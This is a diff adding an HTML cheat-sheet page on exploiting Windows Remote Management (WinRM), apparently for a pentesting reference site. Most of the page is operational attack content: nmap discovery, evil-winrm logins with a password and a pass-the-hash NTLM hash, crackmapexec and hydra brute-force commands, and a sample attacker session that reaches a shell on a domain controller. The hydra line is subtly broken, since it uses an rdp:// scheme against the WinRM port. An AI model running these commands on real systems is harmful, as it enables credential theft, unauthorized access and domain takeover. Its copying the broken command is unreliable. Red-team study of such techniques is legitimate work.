@@ -1,0 +1,169 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">WinRM Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Windows Remote Access</strong> • Focus: <strong>WinRM Abuse & PowerShell Remoting</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Windows Remote Management (WinRM, TCP/5985-5986) enables administrators to 
+    manage and execute PowerShell commands remotely. Misconfigured or exposed 
+    WinRM services allow attackers to authenticate with stolen credentials or 
+    NTLM hashes, enabling remote code execution and lateral movement. 
+    Attackers often exploit WinRM after credential dumping (e.g., from LSASS) 
+    to move laterally across domain systems.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Weak Credentials:</strong> Password spraying and credential reuse common.</li>
+    <li><strong>NTLM Relay:</strong> WinRM accepts NTLM, vulnerable to hash replay attacks.</li>
+    <li><strong>Wide Exposure:</strong> Often enabled across enterprise domains.</li>
+    <li><strong>Full Shell Access:</strong> Remote PowerShell access with authenticated sessions.</li>
+    <li><strong>Lateral Movement:</strong> Common Red Team/attacker technique after initial foothold.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify TCP/5985-5986 services.</li>
+    <li><strong>Authentication:</strong> Attempt login with valid creds, weak passwords, or hashes.</li>
+    <li><strong>Remote Execution:</strong> Use WinRM to execute PowerShell commands.</li>
+    <li><strong>Lateral Movement:</strong> Pivot across domain systems using stolen credentials.</li>
+    <li><strong>Impact:</strong> Persistent remote control and domain compromise.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for WinRM service on TCP/5985 or 5986.</li>
+    <li>Enumerate valid accounts (user lists, Kerberos tickets, dumped creds).</li>
+    <li>Attempt authentication with creds or pass-the-hash.</li>
+    <li>Execute commands via Evil-WinRM, PowerShell Remoting, or Impacket.</li>
+    <li>Escalate privileges and move laterally.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p5985,5986 --script http-winrm-info [target]
+
+# ------------------------------
+# Connect with Evil-WinRM (tool)
+# ------------------------------
+evil-winrm -i [target] -u administrator -p 'Password123!'
+evil-winrm -i [target] -u administrator -H aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a
+
+# ------------------------------
+# PowerShell Remoting (native)
+# ------------------------------
+Enter-PSSession -ComputerName [target] -Credential [domain\user]
+Invoke-Command -ComputerName [target] -ScriptBlock { whoami }
+
+# ------------------------------
+# Brute Force
+# ------------------------------
+crackmapexec winrm [target] -u users.txt -p passwords.txt
+hydra -L users.txt -P rockyou.txt rdp://[target]:5985
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p5985 192.168.1.120
+evil-winrm -i 192.168.1.120 -u administrator -p Summer2025!
+whoami
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p5985,5986 192.168.1.120
+PORT     STATE SERVICE
+5985/tcp open  http   Microsoft HTTPAPI httpd
+5986/tcp open  https  Microsoft HTTPAPI httpd
+
+[ saide ~ ]$ evil-winrm -i 192.168.1.120 -u administrator -p Summer2025!
+Evil-WinRM shell v3.5
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+corp\\administrator
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+DC01
+
+[+] Remote code execution via WinRM achieved
+[+] Attacker has full domain admin access
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample WinRM exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+5985/tcp open  http   WinRM
+5986/tcp open  https  WinRM
+
+# Weak Credentials
+administrator : Summer2025!
+
+# Exploitation
+Evil-WinRM → remote PowerShell shell opened
+
+# Proof of Exploitation
+whoami → corp\\administrator
+hostname → DC01
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-winrm" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting WinRM
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1021/006/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Remote Services: WinRM
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Creds/hash reuse → Evil-WinRM → RCE → Lateral movement.</li>
+  </ul>
+</section>
